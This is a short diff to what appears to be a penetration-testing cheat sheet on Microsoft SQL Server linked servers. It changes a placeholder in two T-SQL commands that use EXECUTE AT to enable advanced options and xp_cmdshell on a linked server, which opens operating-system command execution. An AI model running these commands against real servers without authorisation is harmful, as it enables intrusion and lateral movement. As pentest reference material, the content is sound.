@@ -1862,8 +1862,8 @@ SELECT * FROM OPENQUERY("<SERVER>\<DB>", 'SELECT * FROM sys.configurations WHERE
 #### EXECUTE AT Enable xp_cmdshell
 - RPC out needs to be enabled - this isn't default
 ```
-EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "<SERVER>\<DB>"
-EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<SERVER>\<DB>"
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "<DB>"
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "<DB>"
 ```
  
 #### EXECUTE AT Example
